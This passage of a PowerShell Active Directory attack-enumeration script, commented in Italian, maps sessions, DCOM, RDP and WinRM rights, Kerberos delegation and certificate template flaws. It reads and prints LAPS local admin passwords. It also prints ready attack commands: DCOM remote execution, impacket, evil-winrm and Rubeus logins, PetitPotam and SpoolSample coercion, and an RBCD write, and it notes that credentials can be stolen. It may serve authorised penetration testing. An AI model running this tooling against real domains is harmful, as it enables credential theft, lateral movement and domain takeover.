        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
        
        $users = Get-LoggedOnUsersRemoteRegistry -ComputerName $hostname
        
        if ($null -eq $users) {
            Write-Both "    [*] $name - Remote Registry non disponibile" -Color DarkGray
        }
        elseif ($users.Count -eq 0) {
            Write-Both "    [*] $name - Nessun utente loggato" -Color DarkGray
        }
        else {
            Write-SubSection $name
            foreach ($user in $users) {
                Write-Finding "Utente loggato" $user -Important
                
                if (-not $sessionsFound.ContainsKey($user)) {
                    $sessionsFound[$user] = @()
                }
                $sessionsFound[$user] += $name
            }
        }
    }
    
    if ($sessionsFound.Count -gt 0) {
        Write-Section "RIEPILOGO SESSIONI PER UTENTE"
        foreach ($user in $sessionsFound.Keys) {
            Write-SubSection $user
            foreach ($comp in $sessionsFound[$user]) {
                Write-Finding "Loggato su" $comp
            }
        }
        
        Write-Both ""
        Write-Info "Se hai admin access su questi computer, puoi rubare le credenziali!"
    }
}

function Get-DomainSessionsWMI {
    Write-Banner "SESSIONI VIA WMI"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    Write-Section "Enumerazione sessioni via WMI (Win32_ComputerSystem)"
    Write-Info "Nota: Richiede privilegi admin sul target"
    Write-Both ""
    
    $sessionsFound = @{}
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
        
        try {
            $cs = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $hostname -ErrorAction Stop
            $loggedUser = $cs.UserName
            
            if ($loggedUser) {
                Write-SubSection $name
                Write-Finding "Utente loggato" $loggedUser -Important
                
                if (-not $sessionsFound.ContainsKey($loggedUser)) {
                    $sessionsFound[$loggedUser] = @()
                }
                $sessionsFound[$loggedUser] += $name
            }
            else {
                Write-Both "    [*] $name - Nessuna sessione interattiva" -Color DarkGray
            }
        }
        catch [System.UnauthorizedAccessException] {
            Write-Both "    [*] $name - Accesso WMI negato" -Color DarkGray
        }
        catch {
            Write-Both "    [*] $name - Non raggiungibile" -Color DarkGray
        }
    }
    
    if ($sessionsFound.Count -gt 0) {
        Write-Section "RIEPILOGO SESSIONI WMI"
        foreach ($user in $sessionsFound.Keys) {
            Write-SubSection $user
            foreach ($comp in $sessionsFound[$user]) {
                Write-Finding "Loggato su" $comp
            }
        }
    }
}

function Get-DCOMAccess {
    Write-Banner "PERMESSI DCOM (ExecuteDCOM)"
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    Write-Section "Enumerazione membri 'Distributed COM Users' su computer"
    Write-Info "Nota: Richiede accesso al gruppo locale via WinNT provider"
    Write-Info "Chi ha questi permessi può eseguire codice remoto via DCOM"
    Write-Both ""
    
    $dcomAccess = @{}
    $computersWithDCOM = @()
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
        
        # Test connettività prima
        try {
            $socket = New-Object System.Net.Sockets.TcpClient
            $socket.Connect($hostname, 135)  # DCOM usa porta 135
            $socket.Close()
        }
        catch {
            Write-Both "    [*] $name - Non raggiungibile (porta 135)" -Color DarkGray
            continue
        }
        
        try {
            # Enumera membri del gruppo "Distributed COM Users"
            $group = [ADSI]"WinNT://$hostname/Distributed COM Users,group"
            $members = @($group.Invoke("Members")) | ForEach-Object { 
                try {
                    $_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)
                }
                catch { $null }
            } | Where-Object { $_ }
            
            if ($members.Count -gt 0) {
                $computersWithDCOM += $name
                Write-SubSection "$name ($hostname)"
                
                foreach ($member in $members) {
                    Write-Finding "DCOM User" $member -Important
                    
                    if (-not $dcomAccess.ContainsKey($member)) {
                        $dcomAccess[$member] = @()
                    }
                    $dcomAccess[$member] += $name
                }
            }
            else {
                Write-Both "    [*] $name - Nessun membro custom in Distributed COM Users" -Color DarkGray
            }
        }
        catch [System.Runtime.InteropServices.COMException] {
            Write-Both "    [*] $name - Accesso negato al gruppo locale" -Color DarkGray
        }
        catch {
            Write-Both "    [*] $name - Errore: $($_.Exception.Message)" -Color DarkGray
        }
    }
    
    # Riepilogo per utente
    if ($dcomAccess.Count -gt 0) {
        Write-Section "RIEPILOGO DCOM ACCESS PER UTENTE/GRUPPO"
        
        foreach ($principal in $dcomAccess.Keys) {
            Write-Warning "$principal ha ExecuteDCOM su:"
            foreach ($comp in $dcomAccess[$principal]) {
                Write-Finding "Computer" $comp
            }
            Write-Both ""
        }
        
        Write-Section "ATTACCHI DCOM"
        Write-Info "Se hai credenziali di un utente con DCOM access, puoi eseguire codice:"
        Write-Both ""
        Write-Both "        # PowerShell - MMC20.Application" -Color Yellow
        Write-Both '        $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET"))' -Color Gray
        Write-Both '        $com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami > C:\test.txt", "7")' -Color Gray
        Write-Both ""
        Write-Both "        # PowerShell - ShellWindows" -Color Yellow
        Write-Both '        $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))' -Color Gray
        Write-Both '        $com.Item().Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\System32", $null, 0)' -Color Gray
        Write-Both ""
        Write-Both "        # Impacket - dcomexec.py" -Color Yellow
        Write-Both '        dcomexec.py domain/user:password@TARGET' -Color Gray
        Write-Both ""
    } else {
        Write-Info "Nessun utente/gruppo custom trovato in 'Distributed COM Users'"
        Write-Info "Nota: Local Admins hanno sempre accesso DCOM implicitamente"
    }
}

#endregion

function Get-RemoteAccessPermissions {
    Write-Banner "PERMESSI RDP E PSREMOTING"
    
    Write-Section "Enumerazione Remote Desktop Users e Remote Management Users"
    Write-Info "Enumera quali utenti di dominio possono fare RDP/PSRemoting su ogni macchina"
    Write-Both ""
    
    $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
    
    $rdpAccess = @()      # Chi può fare RDP
    $winrmAccess = @()    # Chi può fare PSRemoting
    
    # Gruppi da enumerare
    $groupsToCheck = @(
        @{ Name = "Remote Desktop Users"; Type = "RDP" },
        @{ Name = "Remote Management Users"; Type = "WinRM" },
        @{ Name = "WinRMRemoteWMIUsers__"; Type = "WinRM" }
    )
    
    foreach ($computer in $computers) {
        $hostname = $computer.Properties.dnshostname[0]
        $name = $computer.Properties.name[0]
        if (-not $hostname) { continue }
        
        # Test connettività (porta 445 per WinNT provider)
        $reachable = $false
        try {
            $socket = New-Object System.Net.Sockets.TcpClient
            $async = $socket.BeginConnect($hostname, 445, $null, $null)
            $wait = $async.AsyncWaitHandle.WaitOne(1000, $false)
            $reachable = $wait -and $socket.Connected
            $socket.Close()
        } catch {}
        
        if (-not $reachable) {
            Write-Both "    [*] $name - Non raggiungibile" -Color DarkGray
            continue
        }
        
        $computerRDP = @()
        $computerWinRM = @()
        
        foreach ($groupInfo in $groupsToCheck) {
            $groupName = $groupInfo.Name
            $accessType = $groupInfo.Type
            
            try {
                $group = [ADSI]"WinNT://$hostname/$groupName,group"
                $members = @($group.Invoke("Members"))
                
                foreach ($member in $members) {
                    try {
                        $adsPath = $member.GetType().InvokeMember("AdsPath", 'GetProperty', $null, $member, $null)
                        $memberName = $member.GetType().InvokeMember("Name", 'GetProperty', $null, $member, $null)
                        $memberClass = $member.GetType().InvokeMember("Class", 'GetProperty', $null, $member, $null)
                        
                        # Parse AdsPath per determinare dominio
                        # Formato: WinNT://DOMAIN/username o WinNT://HOSTNAME/username
                        $isDomain = $false
                        $fullName = $memberName
                        
                        if ($adsPath -match "WinNT://([^/]+)/([^/]+)$") {
                            $source = $matches[1].ToUpper()
                            
                            # Se source non è l'hostname, è un account di dominio
                            if ($source -ne $hostname.Split('.')[0].ToUpper() -and $source -ne $name.ToUpper()) {
                                $isDomain = $true
                                $fullName = "$source\$memberName"
                            }
                        }
                        
                        # Ci interessano solo account di dominio
                        if ($isDomain) {
                            $memberInfo = [PSCustomObject]@{
                                Computer = $name
                                Hostname = $hostname
                                Member = $fullName
                                MemberType = $memberClass  # User o Group
                                ViaGroup = $groupName
                            }
                            
                            if ($accessType -eq "RDP") {
                                $computerRDP += $memberInfo
                            } else {
                                $computerWinRM += $memberInfo
                            }
                        }
                    } catch {}
                }
            }
            catch {
                # Gruppo non esiste o accesso negato
            }
        }
        
        # Output per questo computer
        if ($computerRDP.Count -gt 0 -or $computerWinRM.Count -gt 0) {
            Write-SubSection "$name ($hostname)"
            
            if ($computerRDP.Count -gt 0) {
                Write-Finding "Remote Desktop Users" ""
                foreach ($m in $computerRDP) {
                    $typeTag = if ($m.MemberType -eq "Group") { "[G]" } else { "[U]" }
                    Write-Both "            $typeTag $($m.Member)" -Color Yellow
                }
                $rdpAccess += $computerRDP
            }

            if ($computerWinRM.Count -gt 0) {
                Write-Finding "Remote Management Users" ""
                foreach ($m in $computerWinRM) {
                    $typeTag = if ($m.MemberType -eq "Group") { "[G]" } else { "[U]" }
                    Write-Both "            $typeTag $($m.Member)" -Color Cyan
                }
                $winrmAccess += $computerWinRM
            }
        } else {
            Write-Both "    [*] $name - Nessun utente di dominio in RDP/WinRM groups" -Color DarkGray
        }
    }
    
    #region Riepilogo per Utente/Gruppo
    
    Write-Section "RIEPILOGO RDP ACCESS PER UTENTE/GRUPPO"
    if ($rdpAccess.Count -gt 0) {
        $byMember = $rdpAccess | Group-Object -Property Member
        foreach ($g in ($byMember | Sort-Object -Property Name)) {
            $memberType = $g.Group[0].MemberType
            $typeTag = if ($memberType -eq "Group") { "[GROUP]" } else { "[USER]" }
            Write-Warning "$($g.Name) $typeTag può fare RDP su:"
            foreach ($access in $g.Group) {
                Write-Both "            -> $($access.Computer) ($($access.Hostname))" -Color White
            }
            Write-Both ""
        }
    } else {
        Write-Info "Nessun utente di dominio con RDP access trovato"
    }
    
    Write-Section "RIEPILOGO PSREMOTING ACCESS PER UTENTE/GRUPPO"
    if ($winrmAccess.Count -gt 0) {
        $byMember = $winrmAccess | Group-Object -Property Member
        foreach ($g in ($byMember | Sort-Object -Property Name)) {
            $memberType = $g.Group[0].MemberType
            $typeTag = if ($memberType -eq "Group") { "[GROUP]" } else { "[USER]" }
            Write-Warning "$($g.Name) $typeTag può fare PSRemoting su:"
            foreach ($access in $g.Group) {
                Write-Both "            -> $($access.Computer) ($($access.Hostname))" -Color White
            }
            Write-Both ""
        }
    } else {
        Write-Info "Nessun utente di dominio con PSRemoting access trovato"
    }
    
    #endregion
    
    #region Espansione Gruppi (opzionale ma utile)
    
    Write-Section "ESPANSIONE GRUPPI DI DOMINIO"
    Write-Info "Membri dei gruppi di dominio che hanno accesso remoto"
    Write-Both ""
    
    # Trova tutti i gruppi unici
    $allGroups = @()
    $allGroups += ($rdpAccess | Where-Object { $_.MemberType -eq "Group" } | Select-Object -ExpandProperty Member -Unique)
    $allGroups += ($winrmAccess | Where-Object { $_.MemberType -eq "Group" } | Select-Object -ExpandProperty Member -Unique)
    $allGroups = $allGroups | Select-Object -Unique
    
    foreach ($groupFullName in $allGroups) {
        # Estrai nome gruppo senza dominio
        $groupShortName = $groupFullName.Split('\')[-1]
        
        try {
            $groupObj = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=$groupShortName))"
            if ($groupObj) {
                $members = $groupObj.Properties.member
                
                Write-SubSection "$groupFullName"
                
                if ($members -and $members.Count -gt 0) {
                    foreach ($memberDN in $members) {
                        if ($memberDN -match "CN=([^,]+)") {
                            Write-Both "            -> $($matches[1])" -Color White
                        }
                    }
                } else {
                    Write-Both "            (nessun membro)" -Color DarkGray
                }
            }
        }
        catch {}
    }
    
    #endregion
    
    #region Statistiche finali
    
    Write-Section "STATISTICHE"
    
    $uniqueRDPUsers = ($rdpAccess | Where-Object { $_.MemberType -eq "User" } | Select-Object -ExpandProperty Member -Unique).Count
    $uniqueRDPGroups = ($rdpAccess | Where-Object { $_.MemberType -eq "Group" } | Select-Object -ExpandProperty Member -Unique).Count
    $uniqueWinRMUsers = ($winrmAccess | Where-Object { $_.MemberType -eq "User" } | Select-Object -ExpandProperty Member -Unique).Count
    $uniqueWinRMGroups = ($winrmAccess | Where-Object { $_.MemberType -eq "Group" } | Select-Object -ExpandProperty Member -Unique).Count
    
    Write-Finding "RDP - Utenti di dominio" $uniqueRDPUsers
    Write-Finding "RDP - Gruppi di dominio" $uniqueRDPGroups
    Write-Finding "WinRM - Utenti di dominio" $uniqueWinRMUsers
    Write-Finding "WinRM - Gruppi di dominio" $uniqueWinRMGroups
    
    #endregion
}

function Get-LAPSPasswords {
    Write-Banner "LAPS (Local Administrator Password Solution)"
    
    Write-Section "Ricerca password LAPS leggibili"
    Write-Info "LAPS memorizza password admin locali in ms-Mcs-AdmPwd"
    Write-Both ""
    
    $lapsComputers = @()
    
    try {
        $computers = LDAPSearch -LDAPQuery "(objectCategory=computer)"
        
        foreach ($computer in $computers) {
            $name = $computer.Properties.name[0]
            $lapsPassword = $null
            $lapsExpiration = $null
            
            # Legacy LAPS (ms-Mcs-AdmPwd)
            if ($computer.Properties.'ms-mcs-admpwd') {
                $lapsPassword = $computer.Properties.'ms-mcs-admpwd'[0]
            }
            
            # Expiration time
            if ($computer.Properties.'ms-mcs-admpwdexpirationtime') {
                try {
                    $expTime = [int64]$computer.Properties.'ms-mcs-admpwdexpirationtime'[0]
                    if ($expTime -gt 0) {
                        $lapsExpiration = [datetime]::FromFileTime($expTime)
                    }
                } catch {}
            }
            
            # Windows LAPS (msLAPS-Password)
            if ($computer.Properties.'mslaps-password') {
                $lapsPassword = $computer.Properties.'mslaps-password'[0]
            }
            
            if ($lapsPassword) {
                $lapsComputers += [PSCustomObject]@{
                    ComputerName = $name
                    Password = $lapsPassword
                    Expiration = $lapsExpiration
                    DN = $computer.Properties.distinguishedname[0]
                }
            }
        }
    }
    catch {
        Write-Warning "Errore durante la ricerca LAPS: $_"
    }
    
    if ($lapsComputers.Count -gt 0) {
        Write-Section "PASSWORD LAPS TROVATE! ($($lapsComputers.Count) computer)"
        
        foreach ($comp in $lapsComputers) {
            Write-Warning "$($comp.ComputerName)"
            Write-Finding "Password" $comp.Password -Important
            if ($comp.Expiration) {
                Write-Finding "Scadenza" $comp.Expiration
            }
            Write-Both ""
        }
        
        Write-Section "ATTACCHI CON LAPS PASSWORD"
        Write-Both "        # Connetti con password LAPS (local admin)" -Color Yellow
        Write-Both "        impacket-psexec ./Administrator:'<password>'@<target>" -Color Gray
        Write-Both "        impacket-wmiexec ./Administrator:'<password>'@<target>" -Color Gray
        Write-Both "        evil-winrm -i <target> -u Administrator -p '<password>'" -Color Gray
        Write-Both ""
        Write-Both "        # Da PowerShell" -Color Yellow
        Write-Both '        $cred = New-Object PSCredential(".\Administrator", (ConvertTo-SecureString "<password>" -AsPlainText -Force))' -Color Gray
        Write-Both '        Enter-PSSession -ComputerName <target> -Credential $cred' -Color Gray
        
    } else {
        Write-Info "Nessuna password LAPS leggibile con l'utente corrente"
        Write-Both ""
        Write-Info "LAPS potrebbe essere configurato ma non hai permessi di lettura"
    }
    
    # Verifica se LAPS schema esiste
    Write-Section "Verifica Schema LAPS"
    try {
        $DN = ([adsi]'').distinguishedName
        $configDN = "CN=Schema,CN=Configuration,$DN"
        
        $lapsLegacy = LDAPSearch -LDAPQuery "(cn=ms-Mcs-AdmPwd)" -SearchBase $configDN
        $lapsWindows = LDAPSearch -LDAPQuery "(cn=msLAPS-Password)" -SearchBase $configDN
        
        if ($lapsLegacy -or $lapsWindows) {
            Write-Info "LAPS è installato nel dominio"
            if ($lapsLegacy) { Write-Finding "Legacy LAPS" "Schema presente (ms-Mcs-AdmPwd)" }
            if ($lapsWindows) { Write-Finding "Windows LAPS" "Schema presente (msLAPS-Password)" }
        } else {
            Write-Info "Schema LAPS non trovato - LAPS potrebbe non essere configurato"
        }
    }
    catch {
        Write-Both "        Impossibile verificare schema LAPS" -Color DarkGray
    }
}

function Get-DelegationInfo {
    Write-Banner "KERBEROS DELEGATION"
    
    Write-Section "Analisi configurazioni di delegation"
    Write-Info "Delegation permette a servizi di impersonare utenti"
    Write-Info "Tipi: Unconstrained, Constrained, Resource-Based (RBCD)"
    Write-Both ""
    
    $unconstrainedDelegation = @()
    $constrainedDelegation = @()
    $rbcdDelegation = @()
    
    #region Unconstrained Delegation
    Write-SubSection "Ricerca Unconstrained Delegation..."
    
    # UAC flag TRUSTED_FOR_DELEGATION = 524288 (0x80000)
    # Escludi Domain Controllers (primaryGroupID=516)
    try {
        $unconstrained = LDAPSearch -LDAPQuery "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))"
        
        foreach ($obj in $unconstrained) {
            $name = $obj.Properties.samaccountname[0]
            $dn = $obj.Properties.distinguishedname[0]
            $objectClass = $obj.Properties.objectclass
            $type = if ($objectClass -contains 'computer') { 'Computer' } else { 'User' }
            
            $unconstrainedDelegation += [PSCustomObject]@{
                Name = $name
                Type = $type
                DN = $dn
            }
        }
    }
    catch {
        Write-Warning "Errore ricerca Unconstrained Delegation: $_"
    }
    #endregion
    
    #region Constrained Delegation
    Write-SubSection "Ricerca Constrained Delegation..."
    
    # msDS-AllowedToDelegateTo contiene i servizi target
    try {
        $constrained = LDAPSearch -LDAPQuery "(msDS-AllowedToDelegateTo=*)"
        
        foreach ($obj in $constrained) {
            $name = $obj.Properties.samaccountname[0]
            $dn = $obj.Properties.distinguishedname[0]
            $delegateTo = $obj.Properties.'msds-allowedtodelegateto'
            $objectClass = $obj.Properties.objectclass
            $type = if ($objectClass -contains 'computer') { 'Computer' } else { 'User' }
            
            # Controlla se ha Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION = 16777216)
            $uac = [int64]$obj.Properties.useraccountcontrol[0]
            $protocolTransition = ($uac -band 16777216) -ne 0
            
            $constrainedDelegation += [PSCustomObject]@{
                Name = $name
                Type = $type
                DN = $dn
                DelegateTo = @($delegateTo)
                ProtocolTransition = $protocolTransition
            }
        }
    }
    catch {
        Write-Warning "Errore ricerca Constrained Delegation: $_"
    }
    #endregion
    
    #region Resource-Based Constrained Delegation (RBCD)
    Write-SubSection "Ricerca Resource-Based Constrained Delegation..."
    
    # msDS-AllowedToActOnBehalfOfOtherIdentity contiene chi può delegare verso questo oggetto
    try {
        $rbcd = LDAPSearch -LDAPQuery "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
        
        foreach ($obj in $rbcd) {
            $name = $obj.Properties.samaccountname[0]
            $dn = $obj.Properties.distinguishedname[0]
            $objectClass = $obj.Properties.objectclass
            $type = if ($objectClass -contains 'computer') { 'Computer' } else { 'User' }
            
            # Decodifica il Security Descriptor per trovare chi può delegare
            $allowedPrincipals = @()
            $rawSD = $obj.Properties.'msds-allowedtoactonbehalfofotheridentity'[0]
            
            if ($rawSD) {
                try {
                    $sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($rawSD, 0)
                    foreach ($ace in $sd.DiscretionaryAcl) {
                        try {
                            $sid = $ace.SecurityIdentifier
                            $principal = $sid.Translate([System.Security.Principal.NTAccount]).Value
                            $allowedPrincipals += $principal
                        }
                        catch {
                            $allowedPrincipals += $ace.SecurityIdentifier.Value
                        }
                    }
                }
                catch {}
            }
            
            $rbcdDelegation += [PSCustomObject]@{
                Name = $name
                Type = $type
                DN = $dn
                AllowedPrincipals = $allowedPrincipals
            }
        }
    }
    catch {
        Write-Warning "Errore ricerca RBCD: $_"
    }
    #endregion
    
    #region Output Risultati
    
    # Unconstrained Delegation
    if ($unconstrainedDelegation.Count -gt 0) {
        Write-Section "UNCONSTRAINED DELEGATION TROVATA! ($($unconstrainedDelegation.Count))"
        Write-Warning "CRITICO: Questi oggetti possono impersonare QUALSIASI utente!"
        Write-Both ""
        
        foreach ($obj in $unconstrainedDelegation) {
            Write-Warning "$($obj.Name) [$($obj.Type)]"
            Write-Finding "DN" $obj.DN
            Write-Both ""
        }
        
        Write-Info "Attacco: Se comprometti questo sistema, puoi:"
        Write-Both "        1. Forzare un DC a connettersi (PrinterBug/PetitPotam)" -Color Yellow
        Write-Both "        2. Catturare il TGT del DC" -Color Yellow
        Write-Both "        3. Usare il TGT per DCSync" -Color Yellow
        Write-Both ""
        Write-Both "        # Rubeus - monitora TGT in arrivo" -Color Yellow
        Write-Both "        Rubeus.exe monitor /interval:5 /filteruser:DC$" -Color Gray
        Write-Both ""
        Write-Both "        # SpoolSample - forza connessione da DC" -Color Yellow
        Write-Both "        SpoolSample.exe DC01 YOURCOMPROMISEDSERVER" -Color Gray
        Write-Both ""
        Write-Both "        # PetitPotam" -Color Yellow
        Write-Both "        python3 PetitPotam.py YOURCOMPROMISEDSERVER DC01" -Color Gray
        
    } else {
        Write-Info "Nessuna Unconstrained Delegation trovata (esclusi DC)"
    }
    
    # Constrained Delegation
    if ($constrainedDelegation.Count -gt 0) {
        Write-Section "CONSTRAINED DELEGATION TROVATA ($($constrainedDelegation.Count))"
        
        foreach ($obj in $constrainedDelegation) {
            $ptFlag = if ($obj.ProtocolTransition) { "[PROTOCOL TRANSITION]" } else { "" }
            Write-Warning "$($obj.Name) [$($obj.Type)] $ptFlag"
            
            Write-Finding "Può delegare verso" "" -Important
            foreach ($target in $obj.DelegateTo) {
                Write-Both "            -> $target" -Color Red
            }
            
            if ($obj.ProtocolTransition) {
                Write-Finding "Protocol Transition" "ABILITATO - può impersonare senza autenticazione Kerberos iniziale!" -Important
            }
            Write-Both ""
        }
        
        Write-Info "Attacco con credenziali/hash dell'account:"
        Write-Both ""
        Write-Both "        # Rubeus - S4U2Self + S4U2Proxy" -Color Yellow
        Write-Both "        Rubeus.exe s4u /user:<account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target_spn> /ptt" -Color Gray
        Write-Both ""
        Write-Both "        # Impacket - getST.py" -Color Yellow
        Write-Both "        getST.py -spn <target_spn> -impersonate Administrator domain/<account>:<password>" -Color Gray
        Write-Both "        getST.py -spn <target_spn> -impersonate Administrator -hashes :<ntlm> domain/<account>" -Color Gray
        
        # Evidenzia casi particolarmente pericolosi
        $ldapDelegation = $constrainedDelegation | Where-Object { $_.DelegateTo -match 'ldap/' }
        if ($ldapDelegation) {
            Write-Both ""
            Write-Warning "ATTENZIONE: Delegation verso LDAP trovata - possibile DCSync!"
            foreach ($obj in $ldapDelegation) {
                Write-Both "        $($obj.Name) può delegare verso LDAP -> DCSync possibile!" -Color Red
            }
        }
        
        $cifsTodc = $constrainedDelegation | Where-Object { $_.DelegateTo -match 'cifs/.*dc|cifs/.*domain' }
        if ($cifsTodc) {
            Write-Both ""
            Write-Warning "ATTENZIONE: Delegation CIFS verso DC trovata!"
        }
        
    } else {
        Write-Both ""
        Write-Info "Nessuna Constrained Delegation trovata"
    }
    
    # RBCD
    if ($rbcdDelegation.Count -gt 0) {
        Write-Section "RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) TROVATA ($($rbcdDelegation.Count))"
        
        foreach ($obj in $rbcdDelegation) {
            Write-Warning "$($obj.Name) [$($obj.Type)]"
            Write-Finding "Possono delegare verso questo oggetto" "" -Important
            foreach ($principal in $obj.AllowedPrincipals) {
                Write-Both "            <- $principal" -Color Red
            }
            Write-Both ""
        }
        
        Write-Info "Se controlli uno dei principal autorizzati:"
        Write-Both ""
        Write-Both "        # Rubeus - RBCD attack" -Color Yellow
        Write-Both "        Rubeus.exe s4u /user:<controlled_account>$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target> /ptt" -Color Gray
        Write-Both ""
        Write-Both "        # Impacket" -Color Yellow
        Write-Both "        getST.py -spn cifs/<target> -impersonate Administrator -hashes :<hash> domain/<controlled_account>$" -Color Gray
        
    } else {
        Write-Both ""
        Write-Info "Nessuna RBCD configurata"
    }
    
    # Suggerimenti per configurare RBCD
    Write-Section "CONFIGURARE RBCD (se hai GenericAll/GenericWrite su un computer)"
    Write-Both "        # Requisito: devi controllare un account con SPN (es. machine account)" -Color Yellow
    Write-Both ""
    Write-Both "        # PowerShell - configura RBCD" -Color Yellow
    Write-Both '        $TargetComputer = "TARGET$"' -Color Gray
    Write-Both '        $AttackerSID = (Get-ADComputer YOURCOMPUTER).SID' -Color Gray
    Write-Both '        $SD = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSID")' -Color Gray
    Write-Both '        $SDBytes = New-Object byte[] ($SD.BinaryLength)' -Color Gray
    Write-Both '        $SD.GetBinaryForm($SDBytes, 0)' -Color Gray
    Write-Both '        Set-ADComputer -Identity $TargetComputer -Replace @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$SDBytes}' -Color Gray
    Write-Both ""
    Write-Both "        # Impacket - rbcd.py (più semplice)" -Color Yellow
    Write-Both "        rbcd.py -delegate-from 'YOURCOMPUTER$' -delegate-to 'TARGET$' -action write 'domain/user:password'" -Color Gray
    Write-Both ""
    Write-Both "        # Poi attacca con getST.py come sopra" -Color Yellow
    #endregion
}

function Get-ADCSVulnerabilities {
    Write-Banner "AD CS (Active Directory Certificate Services)"
    
    Write-Section "Analisi Certificate Templates per vulnerabilità ESC"
    Write-Info "Cerca: ESC1, ESC2, ESC3, ESC4, ESC6, ESC7"
    Write-Both ""
    
    $vulnerableTemplates = @()
    $enrollmentAgentTemplates = @()
    
    try {
        $DN = ([adsi]'').distinguishedName
        $configDN = "CN=Configuration,$DN"
        $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
        
        # Query Certificate Templates
        $configEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$configDN")
        $searcher = New-Object System.DirectoryServices.DirectorySearcher($configEntry)
        $searcher.Filter = "(objectClass=pKICertificateTemplate)"
        $searcher.PageSize = 1000
        
        $templates = $searcher.FindAll()
        
        Write-SubSection "Analisi di $($templates.Count) certificate templates..."
        
        # EKU OIDs
        $CLIENT_AUTH_OID = '1.3.6.1.5.5.7.3.2'
        $SMART_CARD_LOGON_OID = '1.3.6.1.4.1.311.20.2.2'
        $PKINIT_CLIENT_AUTH_OID = '1.3.6.1.5.2.3.4'
        $ANY_PURPOSE_OID = '2.5.29.37.0'
        $CERTIFICATE_REQUEST_AGENT_OID = '1.3.6.1.4.1.311.20.2.1'
        $PKCS_REQUEST_AGENT_OID = '1.3.6.1.4.1.311.10.3.4'
        
        # Flag constants
        $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1
        $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME = 2
        $CT_FLAG_PEND_ALL_REQUESTS = 2  # In enrollment flag
        
        foreach ($template in $templates) {
            $props = $template.Properties
            $name = $props.cn[0]
            $displayName = if ($props.displayname) { $props.displayname[0] } else { $name }
            
            $vulns = @()
            $details = @()
            
            # Recupera flags
            $nameFlag = if ($props.'mspki-certificate-name-flag') { [int64]$props.'mspki-certificate-name-flag'[0] } else { 0 }
            $enrollmentFlag = if ($props.'mspki-enrollment-flag') { [int64]$props.'mspki-enrollment-flag'[0] } else { 0 }
            $raSignature = if ($props.'mspki-ra-signature') { [int]$props.'mspki-ra-signature'[0] } else { 0 }
            $schemaVersion = if ($props.'mspki-template-schema-version') { [int]$props.'mspki-template-schema-version'[0] } else { 1 }
            
            # EKU (Extended Key Usage)
            $eku = @()
            if ($props.pkiextendedkeyusage) {
                $eku = @($props.pkiextendedkeyusage)
            }
            if ($props.'mspki-certificate-application-policy') {
                $eku += @($props.'mspki-certificate-application-policy')
            }
            
            # Analisi condizioni
            $enrolleeSuppliesSubject = ($nameFlag -band $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) -ne 0
            $enrolleeSuppliesSAN = ($nameFlag -band $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME) -ne 0
            $noManagerApproval = ($enrollmentFlag -band $CT_FLAG_PEND_ALL_REQUESTS) -eq 0
            $noAuthorizedSignatures = $raSignature -eq 0
            
            # Client Auth capability check
            $hasClientAuth = ($eku -contains $CLIENT_AUTH_OID) -or 
                             ($eku -contains $SMART_CARD_LOGON_OID) -or 
                             ($eku -contains $PKINIT_CLIENT_AUTH_OID) -or 
                             ($eku -contains $ANY_PURPOSE_OID) -or 
                             ($eku.Count -eq 0)  # No EKU = Any purpose
            
            # ESC1: Enrollee supplies subject + Client Auth EKU + No manager approval + No signatures
            if (($enrolleeSuppliesSubject -or $enrolleeSuppliesSAN) -and $hasClientAuth -and $noManagerApproval -and $noAuthorizedSignatures) {
                $vulns += "ESC1"
                $details += "Enrollee può specificare Subject/SAN arbitrario"
            }
            
            # ESC2: Any Purpose EKU o nessun EKU (può essere usato per qualsiasi scopo)
            if ((($eku -contains $ANY_PURPOSE_OID) -or ($eku.Count -eq 0)) -and $noManagerApproval -and $noAuthorizedSignatures) {
                if ("ESC1" -notin $vulns) {  # Non duplicare se già ESC1
                    $vulns += "ESC2"
                    $details += "Any Purpose EKU o nessun EKU"
                }
            }
            
            # ESC3: Certificate Request Agent EKU (può richiedere cert per altri utenti)
            if (($eku -contains $CERTIFICATE_REQUEST_AGENT_OID) -or ($eku -contains $PKCS_REQUEST_AGENT_OID)) {
                if ($noManagerApproval -and $noAuthorizedSignatures) {
                    $vulns += "ESC3"
                    $details += "Certificate Request Agent - può richiedere cert per altri"
                    $enrollmentAgentTemplates += $name
                }
            }
            
            # Salva se vulnerabile
            if ($vulns.Count -gt 0) {
                $vulnerableTemplates += [PSCustomObject]@{
                    Name = $name
                    DisplayName = $displayName
                    Vulnerabilities = $vulns
                    Details = $details
                    EnrolleeSuppliesSubject = $enrolleeSuppliesSubject
